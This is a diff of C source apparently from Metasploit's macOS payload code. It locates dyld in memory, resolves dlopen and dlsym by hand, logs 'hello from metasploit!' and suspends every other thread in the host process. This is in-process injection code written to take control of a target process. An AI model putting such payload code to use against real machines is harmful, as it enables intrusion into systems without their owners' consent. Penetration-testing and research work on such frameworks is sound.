@@ -12,7 +12,7 @@
 #include <sys/types.h>
 #include <sys/sysctl.h>
 
-#ifdef __LP64__
+#if __aarch64__
 typedef struct mach_header_64 mach_header_t;
 typedef struct segment_command_64 segment_command_t;
 typedef struct section_64 section_t;
@@ -110,20 +110,24 @@ void init()
   void* dlopen_addr = 0;
   void* dlsym_addr = 0;
 
-#if __aarch64__
-  dlsym_addr = get_dyld_function("_dlsym");
-  dlopen_addr = get_dyld_function("_dlopen");
-#else
+/*#if __aarch64__*/
+  /*dlsym_addr = get_dyld_function("_dlsym");*/
+  /*dlopen_addr = get_dyld_function("_dlopen");*/
+/*#else*/
   uint64_t start = DYLD_BASE_ADDRESS;
   /*if (sierra) {*/
   /*}*/
   uint64_t dyld = find_macho(start, 0x1000, 0);
+
+  /*typedef void (*func_ptr)();*/
+  /*func_ptr func = (func_ptr)dyld;*/
+  /*func();*/
+
   resolve_dyld_symbol(dyld, &dlopen_addr, &dlsym_addr);
-#endif
+/*#endif*/
 
   typedef void* (*dlopen_ptr)(const char *filename, int flags);
   typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
-
   dlopen_ptr dlopen_func = dlopen_addr;
   dlsym_ptr dlsym_func = dlsym_addr;
   void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
@@ -135,31 +139,30 @@ void init()
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
 
+  // Suspend threads
   typedef mach_port_t (*mach_task_self_ptr)();
   typedef thread_port_t (*mach_thread_self_ptr)();
   typedef kern_return_t (*thread_suspend_ptr)(thread_act_t target_thread);
   typedef kern_return_t (*task_threads_ptr)(task_t task, thread_act_array_t thread_list, mach_msg_type_number_t* thread_count);
-
   void* libIOKit = dlopen_func("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);
   mach_task_self_ptr mach_task_self_func = dlsym_func(libIOKit, "mach_task_self");
   mach_thread_self_ptr mach_thread_self_func = dlsym_func(libIOKit, "mach_thread_self");
   thread_suspend_ptr thread_suspend_func = dlsym_func(libsystem, "thread_suspend");
   task_threads_ptr task_threads_func = dlsym_func(libsystem, "task_threads");
-
+  thread_act_t current_thread = mach_thread_self_func();
   mach_msg_type_number_t thread_count;
   thread_act_array_t thread_list;
-  thread_act_t current_thread = mach_thread_self_func();
   kern_return_t result = task_threads_func(mach_task_self_func(), &thread_list, &thread_count);
-  thread_act_t other_thread;
   if (!result && thread_count) {
     for (unsigned int i = 0; i < thread_count; ++i) {
-      other_thread = thread_list[i];
+      thread_act_t other_thread = thread_list[i];
       if (other_thread != current_thread) {
         thread_suspend_func(other_thread);
       }
     }
   }
 }
+
 
 uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size)
 {
